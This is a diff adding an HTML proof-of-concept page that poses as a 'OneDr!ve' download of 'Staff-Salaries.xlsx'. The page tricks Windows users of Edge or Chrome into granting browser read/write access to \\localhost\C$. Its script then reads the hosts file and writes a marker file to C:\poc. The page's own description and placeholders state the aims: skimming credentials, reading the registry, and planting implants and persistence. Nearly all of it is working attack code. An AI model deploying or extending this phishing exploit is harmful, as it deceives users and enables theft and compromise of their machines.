@@ -1,0 +1,48 @@
+<!DOCTYPE HTML>
+<html>
+	<head><title>C$ access PoC</title></head>
+	<body>
+		<p>Dirty PoC to read/write to C:\\ from the browser for skimming creds / reading reg / writing implants to disk etc. Future work: Fancy CSS, copy path to clipboard (rather than have user enter). Written for low priv users using Edge/Chrome on Windows.</p>
+		<h1 id="header">OneDr!ve - Download "Staff-Salaries.xlsx"</h1>
+		<h1 id="pwnd"></h1>
+		<button id="but">Fancy CSS file download</button>
+		<p style="font-size: 8px" id="hosts"></p>
+	</body>
+	<script>
+		const button = document.getElementById('but');
+		const header = document.getElementById('header');
+		const pwnd = document.getElementById('pwnd');
+		const hostsE = document.getElementById('hosts');
+
+		button.addEventListener('click', async () => {
+			if (button.innerText == "Fancy CSS file download") {
+				header.innerText = "Oh no, your browser doesn't support AES1337 encryption to safely download this CONFIDENTIAL file. We need to write the file to your computer directly. To do so, click 'Grant OneDr!ve permission', enter '\\\\localhost\\C$' into the 'Folder' field, and click 'Allow' when prompted to give OneDr!ve read/write permissios."
+				button.innerText = "Grant OneDr!ve Permission"
+			}
+			else {
+				dirHandle = await window.showDirectoryPicker();
+				pocHandle = await dirHandle.getDirectoryHandle('poc', {create: true})
+				header.innerText = "[Add fake download loader to give browser time to skim filesystem for creds and planting persistences, then...] Safe download complete, check your downloads!"
+				
+				<!-- Read hosts file -->
+				hosts = await dirHandle.getDirectoryHandle("Windows")
+				hosts = await hosts.getDirectoryHandle("system32")
+				hosts = await hosts.getDirectoryHandle("drivers")
+				hosts = await hosts.getDirectoryHandle("etc")
+				hosts = await hosts.getFileHandle("hosts")
+				hosts = await hosts.getFile()
+				hosts = await hosts.text()
+				hostsE.innerText = hosts
+				
+				<!-- Write to C:\poc\poc.txt -->
+				pocHandle = await dirHandle.getDirectoryHandle('poc', {create: true})
+				pocFileHandle = await pocHandle.getFileHandle('poc.txt', {create: true})
+				pocFile = await pocFileHandle.createWritable()
+				await pocFile.write("Pwnd")
+				await pocFile.close()
+				button.remove()
+				pwnd.innerText = "PWND! Here's your hosts file, and I also wrote something to C:\\poc\\poc.txt"
+			}
+		});
+	</script>
+</html>
